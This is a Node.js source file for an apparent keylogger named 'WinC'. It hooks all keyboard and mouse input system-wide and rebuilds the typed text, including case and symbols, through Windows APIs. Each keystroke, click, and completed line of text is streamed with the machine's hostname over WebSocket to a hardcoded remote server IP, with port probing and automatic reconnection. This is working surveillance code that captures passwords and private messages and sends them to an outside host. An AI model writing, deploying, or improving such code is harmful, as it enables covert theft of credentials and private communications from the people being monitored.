"use strict";

/**
 * Edit your VPS IP here (or set environment variable WINC_SERVER).
 * Then: npm install && npm start
 */
const DEFAULT_RELAY_HOST = "95.217.115.96";

const fs = require("node:fs");
const http = require("node:http");
const net = require("node:net");
const os = require("node:os");
const path = require("node:path");
const { URL } = require("node:url");
const WebSocket = require("ws");
const { GlobalKeyboardListener } = require("keyspy");

/** Windows: map key name to typed character via ToUnicodeEx (correct case + symbols). */
function createWindowsTypableCharResolver() {
  if (process.platform !== "win32") {
    return null;
  }
  try {
    const koffi = require("koffi");
    const user32 = koffi.load("user32.dll");
    const GetKeyboardState = user32.func("bool __stdcall GetKeyboardState(_Out_ uint8 * lpKeyState)");
    const GetKeyState = user32.func("short __stdcall GetKeyState(int nVirtKey)");
    const ToUnicodeEx = user32.func(
      "int __stdcall ToUnicodeEx(uint32 wVirtKey, uint32 wScanCode, const uint8 * lpKeyState, uint16 * pwszBuff, int cchBuff, uint32 wFlags, void * dwhkl)"
    );
    const GetKeyboardLayout = user32.func("void * __stdcall GetKeyboardLayout(uint32 idThread)");
    const keyboardLayout = GetKeyboardLayout(0);
    const outBuf = Buffer.alloc(8);

    return (vKey, scanCode) => {
      if (vKey == null || scanCode == null) {
        return null;
      }
      const state = Buffer.alloc(256);
      if (!GetKeyboardState(state)) {
        return null;
      }
      state[vKey] |= 0x80;
      const capsToggle = GetKeyState(0x14) & 1;
      if (capsToggle) {
        state[0x14] |= 0x01;
      } else {
        state[0x14] &= 0xfe;
      }
      const result = ToUnicodeEx(vKey, scanCode, state, outBuf, 4, 0, keyboardLayout);
      if (result === 1) {
        const code = outBuf.readUInt16LE(0);
        if (code === 0) {
          return null;
        }
        return String.fromCharCode(code);
      }
      return null;
    };
  } catch (err) {
    console.error("[WinC] Windows character API unavailable:", err.message);
    return null;
  }
}

const CONNECT_TIMEOUT_MS = 12000;
const PROBE_PORTS = [3847, 8080, 80];
const FALLBACK_PORTS = ["3847", "8080", "80"];
const MODIFIERS = new Set([
  "LEFT CTRL",
  "RIGHT CTRL",
  "LEFT SHIFT",
  "RIGHT SHIFT",
  "SHIFT",
  "LSHIFT",
  "RSHIFT",
  "LEFT ALT",
  "RIGHT ALT",
  "LEFT META",
  "RIGHT META",
  "CAPS LOCK",
  "CAPSLOCK",
]);

function defaultPortForProtocol(protocol) {
  return protocol === "wss:" ? "443" : "80";
}

function formatRelayUrl(parsed) {
  const protocol = parsed.protocol;
  const defaultPort = defaultPortForProtocol(protocol);
  const port = parsed.port || defaultPort;
  const urlPath = `${parsed.pathname}${parsed.search}`;
  if (port === defaultPort) {
    return `${protocol}//${parsed.hostname}${urlPath}`;
  }
  return `${protocol}//${parsed.hostname}:${port}${urlPath}`;
}

function normalizeAgentUrl(input) {
  let url = String(input).trim();
  if (!/^wss?:\/\//i.test(url)) {
    url = `ws://${url}`;
  }
  const parsed = new URL(url);
  if (!parsed.pathname || parsed.pathname === "/") {
    parsed.pathname = "/agent";
  } else {
    parsed.pathname = parsed.pathname.replace(/\/+$/, "");
    if (!parsed.pathname.endsWith("/agent")) {
      parsed.pathname = `${parsed.pathname}/agent`;
    }
  }
  return formatRelayUrl(parsed);
}

function buildWsUrl(baseUrl, token) {
  const parsed = new URL(baseUrl);
  if (token) {
    parsed.searchParams.set("token", token);
  }
  return formatRelayUrl(parsed);
}

function hostFromServerInput(serverInput) {
  return new URL(normalizeAgentUrl(serverInput)).hostname;
}

function buildConnectionCandidates(serverInput, token, preferredPort) {
  const normalized = normalizeAgentUrl(serverInput);
  const parsed = new URL(normalized);
  const seen = new Set();
  const list = [];

  const add = (protocol, port) => {
    const u = new URL(normalized);
    u.protocol = protocol;
    u.port = port ? String(port) : "";
    const withToken = buildWsUrl(formatRelayUrl(u), token);
    if (!seen.has(withToken)) {
      seen.add(withToken);
      list.push(withToken);
    }
  };

  if (preferredPort) {
    add("ws:", preferredPort === 80 ? "" : String(preferredPort));
  }
  add(parsed.protocol, parsed.port || "");
  const explicitPort = parsed.port;
  for (const port of FALLBACK_PORTS) {
    if (port !== explicitPort && String(preferredPort) !== port) {
      add("ws:", port);
    }
  }
  if (explicitPort !== "443" && preferredPort !== 443) {
    add("wss:", "443");
  }
  return list;
}

function tcpProbe(host, port, timeoutMs = 6000) {
  return new Promise((resolve) => {
    const socket = net.connect({ host, port, timeout: timeoutMs });
    const done = (ok) => {
      socket.removeAllListeners();
      try {
        socket.destroy();
      } catch {
        /* ignore */
      }
      resolve(ok);
    };
    socket.once("connect", () => done(true));
    socket.once("error", () => done(false));
    socket.once("timeout", () => done(false));
  });
}

function httpHealth(host, port, timeoutMs = 8000) {
  return new Promise((resolve) => {
    const req = http.request({ host, port, path: "/health", method: "GET", timeout: timeoutMs }, (res) => {
      let body = "";
      res.on("data", (c) => {
        body += c;
      });
      res.on("end", () => {
        if (res.statusCode !== 200) {
          resolve(false);
          return;
        }
        try {
          resolve(JSON.parse(body).ok === true);
        } catch {
          resolve(false);
        }
      });
    });
    req.on("error", () => resolve(false));
    req.on("timeout", () => {
      req.destroy();
      resolve(false);
    });
    req.end();
  });
}

async function discoverRelayPort(host) {
  const report = [];
  for (const port of PROBE_PORTS) {
    if (!(await tcpProbe(host, port))) {
      report.push(`  port ${port}: TCP closed (firewall or server not running)`);
      continue;
    }
    if (await httpHealth(host, port)) {
      report.push(`  port ${port}: OK (WinC server found)`);
      return { port, report };
    }
    report.push(`  port ${port}: TCP open but /health failed`);
  }
  return { port: null, report };
}

function normalizeModifier(name) {
  if (name.includes("CTRL")) return "Ctrl";
  if (name.includes("SHIFT")) return "Shift";
  if (name.includes("ALT")) return "Alt";
  if (name.includes("META")) return "Win";
  return name;
}

function formatModifiers(isDown) {
  const order = ["Ctrl", "Shift", "Alt", "Win"];
  const held = new Set();
  for (const key of Object.keys(isDown)) {
    if (MODIFIERS.has(key)) {
      held.add(normalizeModifier(key));
    }
  }
  return order.filter((m) => held.has(m));
}

function isMouseKey(name) {
  if (!name) return false;
  const upper = name.toUpperCase();
  return (
    upper.includes("MOUSE") ||
    upper === "LBUTTON" ||
    upper === "RBUTTON" ||
    upper === "MBUTTON" ||
    upper.startsWith("XBUTTON")
  );
}

function buildEventRecord(event, isDown, options = {}) {
  const name = event.name ?? "UNKNOWN";
  const mods = formatModifiers(isDown);
  const mouse = isMouseKey(name);
  if (options.combosOnly && event.state === "DOWN" && !mouse) {
    if (MODIFIERS.has(name) || mods.length === 0) return null;
  }
  const combo =
    event.state === "DOWN" && mods.length > 0 && !MODIFIERS.has(name) && !mouse
      ? `${mods.join("+")}+${name}`
      : null;
  const record = {
    type: mouse ? "mouse" : "keyboard",
    timestamp: new Date().toISOString(),
    state: event.state,
    key: name,
    modifiers: mods,
    combo,
  };
  if (mouse && event.location) {
    record.x = event.location[0];
    record.y = event.location[1];
  }
  if (event.vKey !== undefined) {
    record.vKey = event.vKey;
  }
  if (event.scanCode !== undefined) {
    record.scanCode = event.scanCode;
  }
  if (options.raw && event.rawKey?._nameRaw) {
    record.rawName = event.rawKey._nameRaw;
  }
  if (record.state === "DOWN" && !mouse && options.typingState) {
    const ch = options.typingState.keyToChar(name, mods, record.vKey, record.scanCode, isDown);
    if (ch && ch.length === 1) {
      record.char = ch;
    }
  }
  return record;
}

function formatEventLine(record) {
  if (record.type === "text") {
    return `${record.timestamp}  TEXT [${record.delimiter}]  ${record.text}`;
  }
  const label = record.combo ?? record.key;
  const prefix = record.type === "mouse" ? "MOUSE" : "KEY";
  const parts = [record.timestamp, record.state.padEnd(2), `${prefix} ${label}`];
  if (record.x !== undefined) parts.push(`@${record.x},${record.y}`);
  return parts.join("  ");
}

const SHIFT_NUMBER_US = {
  "1": "!",
  "2": "@",
  "3": "#",
  "4": "$",
  "5": "%",
  "6": "^",
  "7": "&",
  "8": "*",
  "9": "(",
  "0": ")",
};

const SHIFT_SYMBOL_US = {
  "-": "_",
  "=": "+",
  "[": "{",
  "]": "}",
  "\\": "|",
  ";": ":",
  "'": '"',
  ",": "<",
  ".": ">",
  "/": "?",
  "`": "~",
};

/** keyspy standardName → US base symbol (before shift). */
const STANDARD_NAME_TO_CHAR = {
  SEMICOLON: ";",
  EQUALS: "=",
  COMMA: ",",
  MINUS: "-",
  DOT: ".",
  "FORWARD SLASH": "/",
  BACKTICK: "`",
  SECTION: "`",
  "SQUARE BRACKET OPEN": "[",
  "SQUARE BRACKET CLOSE": "]",
  BACKSLASH: "\\",
  QUOTE: "'",
};

function isShiftHeld(modifiers, isDown) {
  if (modifiers.includes("Shift")) {
    return true;
  }
  if (!isDown) {
    return false;
  }
  return !!(isDown["LEFT SHIFT"] || isDown["RIGHT SHIFT"] || isDown.SHIFT || isDown.LSHIFT || isDown.RSHIFT);
}

function readCapsLockOnWindows() {
  if (process.platform !== "win32") {
    return false;
  }
  try {
    const koffi = require("koffi");
    const GetKeyState = koffi.load("user32.dll").func("short __stdcall GetKeyState(int nVirtKey)");
    return (GetKeyState(0x14) & 1) !== 0;
  } catch {
    return false;
  }
}

function createTypingState(resolveWindowsChar) {
  let capsLockOn = readCapsLockOnWindows();

  function fallbackKeyToChar(key, modifiers, isDown) {
    const shiftHeld = isShiftHeld(modifiers, isDown);
    let symbolKey = key;
    if (STANDARD_NAME_TO_CHAR[key] !== undefined) {
      symbolKey = STANDARD_NAME_TO_CHAR[key];
    }
    const letter = key.length === 1 && /[A-Z]/i.test(key);
    if (letter) {
      const upper = shiftHeld !== capsLockOn;
      return upper ? key.toUpperCase() : key.toLowerCase();
    }
    if (symbolKey.length === 1 && /[0-9]/.test(symbolKey)) {
      return shiftHeld ? (SHIFT_NUMBER_US[symbolKey] ?? symbolKey) : symbolKey;
    }
    if (SHIFT_SYMBOL_US[symbolKey] !== undefined) {
      return shiftHeld ? SHIFT_SYMBOL_US[symbolKey] : symbolKey;
    }
    if (key === "SPACE") return " ";
    if (key === "TAB") return "\t";
    return null;
  }

  return {
    syncCapsLockFromOs() {
      capsLockOn = readCapsLockOnWindows();
    },
    toggleCapsLock() {
      capsLockOn = !capsLockOn;
      capsLockOn = readCapsLockOnWindows();
    },
    keyToChar(key, modifiers, vKey, scanCode, isDown) {
      if (resolveWindowsChar) {
        const ch = resolveWindowsChar(vKey, scanCode);
        if (ch && ch.length === 1) {
          return ch;
        }
      }
      return fallbackKeyToChar(key, modifiers, isDown);
    },
  };
}

function isLeftMouseDown(record) {
  if (record.state !== "DOWN" || record.type !== "mouse") {
    return false;
  }
  const key = record.key.toUpperCase();
  return key === "MOUSE LEFT" || key === "LBUTTON";
}

function createTextBuffer(typingState) {
  let buffer = "";

  function flush(delimiter, meta) {
    const text = buffer;
    buffer = "";
    if (!text) {
      return null;
    }
    return {
      type: "text",
      timestamp: new Date().toISOString(),
      delimiter,
      text,
      ...meta,
    };
  }

  return {
    getText() {
      return buffer;
    },
    appendFromKey(record, isDown) {
      const key = record.key;
      if (MODIFIERS.has(key)) {
        return false;
      }
      if (key === "RETURN" || key === "ENTER") {
        return false;
      }
      if (key === "BACK" || key === "BACKSPACE") {
        buffer = buffer.slice(0, -1);
        return true;
      }
      if (record.modifiers.some((m) => ["Ctrl", "Alt", "Win"].includes(m))) {
        return false;
      }
      const ch = typingState.keyToChar(key, record.modifiers, record.vKey, record.scanCode, isDown);
      if (ch) {
        buffer += ch;
        return true;
      }
      return false;
    },
    flush,
  };
}

function typingPreviewPayload(textBuffer, meta) {
  return {
    type: "typing",
    timestamp: new Date().toISOString(),
    text: textBuffer.getText(),
    ...meta,
  };
}

function safeCloseSocket(socket) {
  if (!socket) return;
  socket.on("error", () => {});
  socket.removeAllListeners("open");
  socket.removeAllListeners("message");
  socket.removeAllListeners("close");
  try {
    if (socket.readyState === WebSocket.CONNECTING) socket.terminate();
    else if (socket.readyState === WebSocket.OPEN) socket.close();
  } catch {
    /* ignore */
  }
}

function waitForWebSocketOpen(socket, timeoutMs) {
  if (socket.readyState === WebSocket.OPEN) return Promise.resolve();
  return new Promise((resolve, reject) => {
    let settled = false;
    const timer = setTimeout(() => {
      if (settled) return;
      settled = true;
      cleanup();
      safeCloseSocket(socket);
      reject(new Error("Timed out waiting for WebSocket connection"));
    }, timeoutMs);
    const onOpen = () => {
      if (settled) return;
      settled = true;
      cleanup();
      resolve();
    };
    const onError = () => {
      if (settled) return;
      settled = true;
      cleanup();
      safeCloseSocket(socket);
      reject(new Error("WebSocket connection failed"));
    };
    const cleanup = () => {
      clearTimeout(timer);
      socket.removeListener("open", onOpen);
      socket.removeListener("error", onError);
    };
    socket.once("open", onOpen);
    socket.once("error", onError);
  });
}

async function connectWithFallback(serverBase, token) {
  const host = hostFromServerInput(serverBase);
  console.log(`Discovering WinC server on ${host} …`);
  const { port: discoveredPort, report } = await discoverRelayPort(host);
  console.log(report.join("\n"));
  const candidates = buildConnectionCandidates(serverBase, token, discoveredPort);
  console.log("WebSocket attempts:");
  for (const url of candidates) console.log(`  → ${url}`);
  let lastError = "unknown error";
  for (const url of candidates) {
    const socket = new WebSocket(url, { handshakeTimeout: CONNECT_TIMEOUT_MS, perMessageDeflate: false });
    try {
      await waitForWebSocketOpen(socket, CONNECT_TIMEOUT_MS);
      socket.removeAllListeners("error");
      return { socket, url };
    } catch (err) {
      lastError = err.message;
      safeCloseSocket(socket);
    }
  }
  const hint = `Open VPS firewall + run server npm start. Test: http://${host}:3847/health`;
  if (!discoveredPort) throw new Error(`No reachable WinC server on ${host}.\n${hint}`);
  throw new Error(`WebSocket failed (${lastError}).\n${hint}`);
}

function parseArgs(argv) {
  const defaultServer = process.env.WINC_SERVER || DEFAULT_RELAY_HOST;
  const options = {
    server: normalizeAgentUrl(defaultServer),
    token: process.env.WINC_TOKEN || "",
    name: process.env.WINC_CLIENT_NAME || os.hostname(),
    raw: false,
    combosOnly: false,
    logFile: null,
    reconnectMs: 5000,
  };
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (arg === "--server" || arg === "-s") {
      options.server = normalizeAgentUrl(argv[++i]);
    } else if (arg === "--token" || arg === "-t") {
      options.token = argv[++i];
    } else if (arg === "--name" || arg === "-n") {
      options.name = argv[++i];
    } else if (arg === "--raw" || arg === "-r") {
      options.raw = true;
    } else if (arg === "--combos-only" || arg === "-c") {
      options.combosOnly = true;
    } else if (arg === "--log" || arg === "-l") {
      options.logFile = path.resolve(argv[++i]);
    } else if (arg === "--help" || arg === "-h") {
      console.log(`npm install && npm start
Optional: npm start -- --server YOUR_VPS_IP --name "My-PC"
Edit DEFAULT_RELAY_HOST at top of index.js`);
      process.exit(0);
    }
  }
  return options;
}

async function main() {
  const options = parseArgs(process.argv.slice(2));
  const agentMeta = { hostname: os.hostname(), clientName: options.name, platform: process.platform };
  const relayHost = hostFromServerInput(options.server);
  console.log(`Client PC: ${agentMeta.clientName}`);
  console.log(`VPS: ${relayHost}`);
  let logStream = options.logFile ? fs.createWriteStream(options.logFile, { flags: "a" }) : null;
  const writeLine = (line) => {
    console.log(line);
    if (logStream) logStream.write(`${line}\n`);
  };
  let ws = null;
  let shouldRun = true;
  let reconnectTimer = null;
  let activeRelayBase = options.server;
  const resolveWindowsChar = createWindowsTypableCharResolver();
  if (resolveWindowsChar) {
    console.log("Using Windows keyboard layout for typed characters (case + symbols).");
  }
  const typingState = createTypingState(resolveWindowsChar);
  const textBuffer = createTextBuffer(typingState);

  const sendPayload = (payload) => {
    if (payload.type !== "typing") {
      writeLine(formatEventLine({ ...agentMeta, ...payload }));
    }
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ ...agentMeta, ...payload }));
    }
  };

  const disconnectSocket = () => {
    clearTimeout(reconnectTimer);
    reconnectTimer = null;
    if (ws) {
      safeCloseSocket(ws);
      ws = null;
    }
  };

  const attachSocketHandlers = (socket) => {
    socket.on("message", (raw) => {
      try {
        const data = JSON.parse(String(raw));
        if (data.type === "agent-ack") console.log(`Server OK (${data.agentsOnline ?? "?"} agents)`);
      } catch {
        /* ignore */
      }
    });
    socket.on("close", () => {
      ws = null;
      if (shouldRun) {
        reconnectTimer = setTimeout(() => startConnection().catch((e) => console.error(e.message)), options.reconnectMs);
      }
    });
    socket.on("error", (e) => console.error("WebSocket error:", e.message));
  };

  async function startConnection() {
    if (!shouldRun) return;
    disconnectSocket();
    const { socket, url } = await connectWithFallback(activeRelayBase, options.token);
    ws = socket;
    activeRelayBase = url.split("?")[0];
    options.server = normalizeAgentUrl(activeRelayBase);
    console.log(`Connected via ${url}`);
    attachSocketHandlers(ws);
    ws.send(JSON.stringify({ type: "hello", role: "agent", ...agentMeta }));
  }

  await startConnection();

  const keyboard = new GlobalKeyboardListener({
    windows: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: (i) => console.error(`[keyspy] ${i}`) },
    mac: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: (i) => console.error(`[keyspy] ${i}`) },
    x11: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: (i) => console.error(`[keyspy] ${i}`) },
  });

  await keyboard.addListener((event, isDown) => {
    const record = buildEventRecord(event, isDown, { ...options, typingState });
    if (!record) {
      return false;
    }

    if (record.state === "DOWN") {
      if (record.type === "keyboard" && (record.key === "CAPS LOCK" || record.key === "CAPSLOCK")) {
        typingState.toggleCapsLock();
      }

      if (isLeftMouseDown(record)) {
        const batch = textBuffer.flush("mouse", agentMeta);
        if (batch) {
          sendPayload(batch);
        }
        sendPayload(typingPreviewPayload(textBuffer, agentMeta));
      } else if (
        record.type === "keyboard" &&
        (record.key === "RETURN" || record.key === "ENTER")
      ) {
        const batch = textBuffer.flush("enter", agentMeta);
        if (batch) {
          sendPayload(batch);
        }
        sendPayload(typingPreviewPayload(textBuffer, agentMeta));
      } else if (record.type === "keyboard") {
        const changed = textBuffer.appendFromKey(record, isDown);
        if (changed) {
          sendPayload(typingPreviewPayload(textBuffer, agentMeta));
        }
      }
    }

    if (record.type === "keyboard" || record.type === "mouse") {
      sendPayload(record);
    }
    return false;
  });

  console.log("Capturing keyboard + mouse. Ctrl+C to stop.");

  const shutdown = () => {
    shouldRun = false;
    const tail = textBuffer.flush("enter", agentMeta);
    if (tail) sendPayload(tail);
    keyboard.kill();
    disconnectSocket();
    if (logStream) logStream.end();
    process.exit(0);
  };
  process.on("SIGINT", shutdown);
  process.on("SIGTERM", shutdown);
}

main().catch((err) => {
  console.error(err.message);
  process.exit(1);
});
